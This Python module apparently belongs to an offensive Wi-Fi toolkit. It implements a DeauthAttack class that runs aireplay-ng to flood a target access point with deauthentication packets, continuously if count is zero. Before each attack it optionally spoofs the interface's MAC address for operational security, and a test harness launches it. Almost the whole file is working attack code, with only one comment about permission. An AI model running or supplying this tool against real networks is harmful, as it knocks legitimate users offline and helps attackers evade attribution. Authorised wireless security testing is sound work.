import subprocess
import logging
import os # For __main__ example
import sys # For __main__ example
from typing import Dict, Any, Optional, List

# Attempt to import from local package structure
try:
    from backend import config
    from backend.plugins.opsec_utils import MACChanger
    from backend.core.network_utils import interface_exists, is_monitor_mode
    from backend.core.event_logger import log_event
except ImportError:
    # Fallback for direct execution or different environment setups
    logger = logging.getLogger(__name__)
    logger.warning("Running DeauthAttack with fallback imports. Ensure necessary modules (config, plugins.opsec_utils, core.network_utils, core.event_logger) are accessible.")
    # Define dummy config and log_event if they are not available for standalone testing
    class DummyConfig:
        MAC_CHANGE_ENABLED = False # Default secure behavior
    config = DummyConfig() # type: ignore

    def log_event(event_type: str, data: Dict[str, Any]) -> None: # type: ignore
        print(f"DUMMY_LOG_EVENT: {event_type} - {data}")

    # For network_utils and MACChanger, direct execution would require them to be in PYTHONPATH
    # or a more complex fallback setup. For this exercise, we assume they might fail to import
    # if not run as part of the main application, and __main__ will handle this.
    # This is a simplification for the current task.
    try:
        from backend.plugins.opsec_utils import MACChanger
        from backend.core.network_utils import interface_exists, is_monitor_mode
    except ImportError:
        MACChanger = None # type: ignore
        def interface_exists(iface: str) -> bool: return False # type: ignore
        def is_monitor_mode(iface: str) -> bool: return False # type: ignore
        logger.error("Failed to import MACChanger or network_utils in fallback. __main__ test might be limited.")


logger = logging.getLogger(__name__)

class DeauthAttack:
    """
    Manages and executes a deauthentication (deauth) attack using aireplay-ng.

    This class can optionally change the MAC address of the attacking interface
    before launching the attack and revert it afterwards, based on configuration.
    It performs checks for interface existence and monitor mode status.
    """

    def __init__(self,
                 iface: str,
                 target_mac: str,
                 count: int = 10):
        """
        Initializes the DeauthAttack instance.

        Args:
            iface: The name of the wireless interface to use for the attack.
                   This interface should be in monitor mode.
            target_mac: The MAC address of the target Access Point (AP) or client.
                        If targeting an AP (recommended), this is its BSSID.
                        If targeting a specific client, this is the client's MAC, and
                        the AP's BSSID should also be implicitly known or handled by aireplay-ng context.
                        (Note: aireplay-ng's `-a` is for AP, `-c` for client. This class uses `-a`).
            count: The number of deauth packets to send. Defaults to 10.
                   A value of 0 means continuous deauthentication.
        """
        self.iface: str = iface
        self.target_mac: str = target_mac
        self.count: int = count
        # self.process is not used in this version as subprocess.run is blocking.
        # If Popen were used for continuous deauth, it would be relevant.

        logger.debug(f"DeauthAttack initialized: iface='{self.iface}', target_mac='{self.target_mac}', count={self.count}")

    def run(self) -> Dict[str, Any]:
        """
        Executes the deauthentication attack using aireplay-ng.

        Handles MAC address spoofing (if enabled in config) before the attack
        and reversion after the attack. Performs pre-flight checks on the interface.

        Returns:
            A dictionary containing the status and details of the attack:
            {
                "status": "success" | "error",
                "message": "Descriptive message of the outcome.",
                "command": ["executed", "command", "list"] (if applicable),
                "output": "stdout from aireplay-ng" (if applicable),
                "error_output": "stderr from aireplay-ng" (if applicable),
                "return_code": integer_exit_code_or_None (if applicable)
            }
        """
        base_event_data = {
            "interface": self.iface, "target_bssid": self.target_mac, "count": self.count
        }

        # Safely get MAC_CHANGE_ENABLED from config, default to False if not found
        mac_change_enabled = getattr(config, 'MAC_CHANGE_ENABLED', False)

        original_mac_address: Optional[str] = None
        mac_changer_instance: Optional[MACChanger] = None
        mac_changed_successfully: bool = False

        if mac_change_enabled:
            if not MACChanger: # Check if MACChanger failed to import in fallback
                logger.error("MAC_CHANGE_ENABLED is True, but MACChanger utility is not available (import failed). Skipping MAC change.")
                log_event("deauth_mac_change_skipped", {**base_event_data, "reason": "MACChanger unavailable"})
            else:
                logger.info(f"MAC_CHANGE_ENABLED is True. Attempting MAC change for deauth on '{self.iface}'.")
                log_event("deauth_mac_change_initiated", base_event_data)
                mac_changer_instance = MACChanger()
                if mac_changer_instance._check_macchanger_installed(): # type: ignore
                    original_mac_address = mac_changer_instance.get_current_mac(self.iface)
                    if original_mac_address:
                        logger.info(f"Original MAC for '{self.iface}': {original_mac_address}")
                        base_event_data["original_mac"] = original_mac_address
                        new_mac, _ = mac_changer_instance.set_mac_random(self.iface)
                        if new_mac and new_mac.lower() != original_mac_address.lower():
                            logger.info(f"Set random MAC for '{self.iface}' to '{new_mac}' for deauth attack.")
                            log_event("deauth_mac_changed_success", {**base_event_data, "new_mac": new_mac})
                            mac_changed_successfully = True
                        elif new_mac: # MAC was already the new_mac or didn't change as reported by macchanger
                            logger.info(f"MAC for '{self.iface}' is '{new_mac}' (may not have changed if already random or due to tool behavior). Proceeding.")
                            mac_changed_successfully = True # Still proceed, MAC is what it is
                        else:
                            logger.warning(f"Failed to set random MAC for '{self.iface}'. Attack will proceed with current/original MAC: {original_mac_address}.")
                            log_event("deauth_mac_change_failed", {**base_event_data, "reason": "set_mac_random returned None"})
                    else:
                        logger.warning(f"Could not get original MAC for '{self.iface}'. Skipping MAC change for deauth.")
                        log_event("deauth_mac_change_failed", {**base_event_data, "reason": "Could not get original MAC"})
                else:
                    logger.warning("MACChanger utility (macchanger command) not found or not operational. Skipping MAC change.")
                    log_event("deauth_mac_change_skipped", {**base_event_data, "reason": "macchanger command not found"})
        else:
            logger.info("MAC_CHANGE_ENABLED is False. Skipping MAC change for deauth attack.")
            log_event("deauth_mac_change_skipped", {**base_event_data, "reason": "Configuration disabled"})


        # --- Pre-attack Interface Checks ---
        if not interface_exists(self.iface):
            msg = f"Interface '{self.iface}' does not exist. Cannot start deauth attack."
            logger.error(msg)
            log_event("deauth_attack_failed", {**base_event_data, "reason": msg, "details": "Interface existence check failed pre-attack"})
            self._revert_mac_if_needed(mac_changer_instance, original_mac_address, mac_changed_successfully, base_event_data)
            return {"status": "error", "message": msg}

        if not is_monitor_mode(self.iface):
            msg = f"Interface '{self.iface}' is not in monitor mode. Aireplay-ng requires monitor mode."
            logger.warning(msg) # Warning because aireplay-ng will likely fail and report it.
            log_event("deauth_attack_warning", {**base_event_data, "reason": msg, "details": "Monitor mode check failed pre-attack"})
            # Allowing to proceed as aireplay-ng will ultimately determine if it can run.

        cmd: List[str] = [
            "aireplay-ng",
            "--deauth", str(self.count),
            "-a", self.target_mac,
            self.iface
        ]

        current_mac_for_log = mac_changer_instance.get_current_mac(self.iface) if mac_changer_instance and mac_change_enabled else "N/A (unchanged or not checked)"
        logger.info(f"Proceeding with deauth attack on target '{self.target_mac}' via interface '{self.iface}' (current MAC: {current_mac_for_log}). Command: {' '.join(cmd)}")
        log_event("deauth_attack_started", {**base_event_data, "command": ' '.join(cmd), "interface_mac_at_attack": current_mac_for_log})

        # Timeout calculation: base 15s + 0.5s per packet (if count > 0). Min 20s, max 120s.
        # If count is 0 (continuous), use a larger fixed timeout (e.g. from config or a default like 300s).
        # This example uses subprocess.run, which is blocking. For continuous (count=0), Popen would be better.
        # For now, assuming count > 0 for typical use with run().
        if self.count == 0:
            # For continuous deauth, this timeout is how long subprocess.run will block.
            # A separate mechanism (like self.shutdown using Popen) would be needed to stop it earlier.
            # This timeout should be reasonably long if count=0, or this function will terminate the continuous attack.
            calculated_timeout: int = getattr(config, 'CONTINUOUS_DEAUTH_DURATION', 300) # Default 5 mins for continuous
            logger.info(f"Continuous deauth (count=0) requested. Process will run for up to {calculated_timeout}s unless interrupted.")
        else:
            calculated_timeout = min(max(15 + int(self.count * 0.5), 20), 120)

        logger.debug(f"Calculated timeout for aireplay-ng: {calculated_timeout}s for {self.count} deauth packets.")
        base_event_data["calculated_timeout"] = calculated_timeout

        attack_outcome: Dict[str, Any] = {}
        try:
            # subprocess.run executes the command and waits for it to complete or timeout.
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                check=True, # Raises CalledProcessError for non-zero exit codes
                timeout=calculated_timeout,
                encoding='utf-8',
                errors='ignore' # In case of weird characters in output
            )

            logger.debug(f"Deauth attack raw stdout (iface: {self.iface}, target: {self.target_mac}):\n{result.stdout}")
            if result.stderr: # aireplay-ng often uses stderr for status messages, even on success
                logger.debug(f"Deauth attack raw stderr (iface: {self.iface}, target: {self.target_mac}):\n{result.stderr}")

            # Success is primarily determined by check=True (exit code 0).
            msg = f"Deauth attack command executed for {self.count} packets. Aireplay-ng exited successfully."
            logger.info(msg)
            log_event("deauth_attack_success", {**base_event_data, "stdout": result.stdout, "stderr": result.stderr, "return_code": result.returncode})
            attack_outcome = {
                "status": "success", "message": msg, "command": cmd,
                "output": result.stdout, "error_output": result.stderr, "return_code": result.returncode
            }

        except subprocess.CalledProcessError as e:
            msg = f"Aireplay-ng command failed with exit code {e.returncode}."
            logger.error(msg + f" Command: '{' '.join(e.cmd)}'. Stderr: {e.stderr.strip() if e.stderr else 'N/A'}", exc_info=True)
            log_event("deauth_attack_failed", {
                **base_event_data, "reason": "aireplay-ng non-zero exit code", "return_code": e.returncode,
                "stdout": e.stdout.strip() if e.stdout else "", "stderr": e.stderr.strip() if e.stderr else ""
            })
            attack_outcome = {
                "status": "error", "message": msg + (f" Stderr: {e.stderr.strip()}" if e.stderr else ""),
                "command": e.cmd, "output": e.stdout.strip() if e.stdout else "",
                "error_output": e.stderr.strip() if e.stderr else "", "return_code": e.returncode
            }
        except subprocess.TimeoutExpired as e:
            msg = f"Deauth attack command timed out after {calculated_timeout}s."
            logger.error(msg + f" Command: '{' '.join(e.cmd)}'", exc_info=True)
            stderr_on_timeout = e.stderr.strip() if isinstance(e.stderr, str) else (e.stderr.decode('utf-8', 'ignore').strip() if e.stderr else "")
            stdout_on_timeout = e.stdout.strip() if isinstance(e.stdout, str) else (e.stdout.decode('utf-8', 'ignore').strip() if e.stdout else "")
            log_event("deauth_attack_failed", {
                **base_event_data, "reason": "timeout", "timeout_duration": calculated_timeout,
                "stdout_partial": stdout_on_timeout, "stderr_partial": stderr_on_timeout
            })
            attack_outcome = {
                "status": "error", "message": msg, "command": e.cmd,
                "output": stdout_on_timeout, "error_output": stderr_on_timeout
            }
        except FileNotFoundError:
            msg = "'aireplay-ng' command not found. Please ensure aircrack-ng suite is installed and in PATH."
            logger.error(msg, exc_info=True)
            log_event("deauth_attack_failed", {**base_event_data, "reason": "aireplay-ng not found"})
            attack_outcome = {"status": "error", "message": msg, "command": cmd}
        except Exception as e:
            msg = f"An unexpected error occurred during deauth attack: {str(e)}"
            logger.error(msg + f" Command: '{' '.join(cmd)}'", exc_info=True)
            log_event("deauth_attack_failed", {**base_event_data, "reason": f"Unexpected exception: {str(e)}", "exception_type": type(e).__name__})
            attack_outcome = {"status": "error", "message": msg, "command": cmd}
        finally:
            self._revert_mac_if_needed(mac_changer_instance, original_mac_address, mac_changed_successfully, base_event_data)

        return attack_outcome

    def _revert_mac_if_needed(self,
                              mac_changer: Optional[MACChanger],
                              original_mac: Optional[str],
                              mac_was_changed: bool,
                              base_event_data: Dict[str, Any]) -> None:
        """Helper method to revert MAC address if it was changed."""
        if getattr(config, 'MAC_CHANGE_ENABLED', False) and mac_changer and original_mac and mac_was_changed:
            current_mac_before_revert = mac_changer.get_current_mac(self.iface) # Get potentially spoofed MAC
            logger.info(f"Attempting to revert MAC for '{self.iface}' from '{current_mac_before_revert}' to original '{original_mac}'.")
            restored_mac, msg = mac_changer.revert_to_original_mac(self.iface) # This method in MACChanger now handles its own event logging.
            # Event logging for revert is handled within MACChanger.revert_to_original_mac
            # We can add a specific deauth context log if needed.
            if restored_mac and restored_mac.lower() == original_mac.lower():
                logger.info(f"Successfully reverted MAC for '{self.iface}' to '{restored_mac}'.")
                # log_event("deauth_mac_reverted_success", {**base_event_data, "reverted_to_mac": restored_mac}) # Covered by MACChanger
            elif restored_mac: # Reverted, but to something unexpected
                logger.warning(f"Reverted MAC for '{self.iface}' to '{restored_mac}', but original was '{original_mac}'.")
                # log_event("deauth_mac_reverted_warning", {**base_event_data, "reverted_to_mac": restored_mac, "expected_mac": original_mac, "details": msg})
            else: # Failed to revert
                logger.error(f"Failed to revert MAC for '{self.iface}' to '{original_mac}'. Current MAC might still be '{current_mac_before_revert}'. Details: {msg}")
                # log_event("deauth_mac_revert_failed", {**base_event_data, "original_mac": original_mac, "current_mac": current_mac_before_revert, "error_details": msg})
        elif getattr(config, 'MAC_CHANGE_ENABLED', False) and mac_changer and original_mac and not mac_was_changed:
             logger.info(f"MAC for '{self.iface}' was not successfully changed from '{original_mac}', so no reversion needed based on initial change status.")
        # No log event needed if MAC change was not enabled or original_mac was not fetched.

    def shutdown(self) -> None:
        """
        Handles shutdown logic for the DeauthAttack.
        For this implementation using `subprocess.run` (which is blocking),
        there isn't an ongoing background process to terminate explicitly here.
        If `aireplay-ng` with `count=0` were run via `Popen`, this method would
        terminate `self.process`.
        """
        logger.info("DeauthAttack shutdown called. Since 'aireplay-ng' is run blockingly, no active process is typically managed by this instance for termination here.")
        # If self.process was used (e.g., for Popen with count=0):
        # if self.process and self.process.poll() is None:
        #     logger.info(f"Terminating active aireplay-ng process (PID: {self.process.pid})...")
        #     self.process.terminate()
        #     try:
        #         self.process.wait(timeout=5)
        #         logger.info("Aireplay-ng process terminated.")
        #     except subprocess.TimeoutExpired:
        #         logger.warning("Aireplay-ng did not terminate gracefully, killing.")
        #         self.process.kill()
        #     self.process = None


if __name__ == '__main__':
    # --- Test Setup ---
    logging.basicConfig(
        level=logging.DEBUG,
        format="%(asctime)s [%(levelname)s] %(name)s (%(filename)s:%(lineno)d %(funcName)s): %(message)s",
        stream=sys.stdout
    )
    logger.info("--- Starting Deauth Attack Module Test ---")

    # --- IMPORTANT: Test Prerequisites ---
    # 1. Root Privileges: This script MUST be run as root (or with `sudo`) to use
    #    `aireplay-ng` and `macchanger`.
    # 2. Monitor Mode Interface: You NEED a wireless interface already in MONITOR MODE.
    #    - Create one using `sudo airmon-ng start <your_wifi_interface_name>`.
    #    - Verify with `iwconfig <monitor_interface_name>`.
    # 3. Aircrack-ng Suite: Ensure `aireplay-ng` is installed and in PATH.
    # 4. Macchanger (Optional but Recommended for MAC Spoofing Test): Ensure `macchanger` is installed.
    # ---

    # ** MODIFY THESE VALUES FOR YOUR TEST ENVIRONMENT **
    # Replace "mon0_placeholder" with your actual monitor mode interface name (e.g., "wlan0mon").
    test_interface = "mon0_placeholder"
    # Replace "AA:BB:CC:DD:EE:FF" with a valid MAC address of a target AP in your vicinity.
    # Be responsible: only target networks you have explicit permission to test.
    test_target_mac = "AA:BB:CC:DD:EE:FF"
    test_packet_count = 5  # Small number of packets for testing

    logger.info(f"--- Test Configuration ---")
    logger.info(f"Test Interface: '{test_interface}'")
    logger.info(f"Test Target MAC: '{test_target_mac}'")
    logger.info(f"Test Packet Count: {test_packet_count}")
    logger.info(f"MAC Spoofing Enabled in Config (simulated for test): {getattr(config, 'MAC_CHANGE_ENABLED', False)}")


    # --- Pre-run Checks (Essential for a meaningful test) ---
    if "mon0_placeholder" == test_interface or not test_interface:
        logger.critical("CRITICAL TEST SETUP ERROR: 'test_interface' is a placeholder or empty.")
        logger.critical("Please update this variable in the script to your actual wireless interface in monitor mode.")
        sys.exit(1)

    if "AA:BB:CC:DD:EE:FF" == test_target_mac or len(test_target_mac) != 17:
        logger.critical("CRITICAL TEST SETUP ERROR: 'test_target_mac' is a placeholder or invalid.")
        logger.critical("Please update this variable to a valid MAC address for a target AP.")
        sys.exit(1)

    if MACChanger is None and getattr(config, 'MAC_CHANGE_ENABLED', False):
         logger.warning("MACChanger could not be imported (likely due to fallback). MAC spoofing part of the test will be skipped or limited.")

    # Note: Interface existence and monitor mode are checked within DeauthAttack.run()
    # but for __main__ testing, it's good to be aware.
    logger.info("Pre-run checks for placeholder values passed. Further checks (existence, monitor mode) are inside DeauthAttack.run().")

    # --- Test Execution ---
    logger.info(f"\n--- Initializing DeauthAttack ---")
    attack_instance = DeauthAttack(
        iface=test_interface,
        target_mac=test_target_mac,
        count=test_packet_count
    )

    logger.info(f"\n--- Starting Deauth Attack ---")
    attack_result_dict: Dict[str, Any] = {}
    try:
        attack_result_dict = attack_instance.run()
    except Exception as e_run: # Catch exceptions from the run() call itself
        logger.error(f"An unexpected exception occurred directly from attack_instance.run(): {e_run}", exc_info=True)
        attack_result_dict = {"status": "exception_in_test_harness_run", "message": str(e_run)}
    # finally:
        # attack_instance.shutdown() # shutdown() currently does little for subprocess.run

    # --- Test Results ---
    logger.info(f"\n--- Deauth Attack Test Summary ---")
    logger.info(f"Status: {attack_result_dict.get('status')}")
    logger.info(f"Message: {attack_result_dict.get('message')}")
    if "command" in attack_result_dict:
        logger.info(f"Command Executed: {' '.join(attack_result_dict['command'])}")
    if "output" in attack_result_dict and attack_result_dict["output"]:
        logger.info(f"Stdout:\n{attack_result_dict['output']}")
    if "error_output" in attack_result_dict and attack_result_dict["error_output"]:
        logger.warning(f"Stderr:\n{attack_result_dict['error_output']}") # Stderr might contain useful info even on success for aireplay
    if "return_code" in attack_result_dict:
        logger.info(f"Return Code: {attack_result_dict['return_code']}")

    logger.info("\n--- Deauth Attack Module Test Finished ---")
    logger.info("Review logs for detailed outcomes. Ensure you used a valid monitor interface and target MAC, and ran with root privileges.")
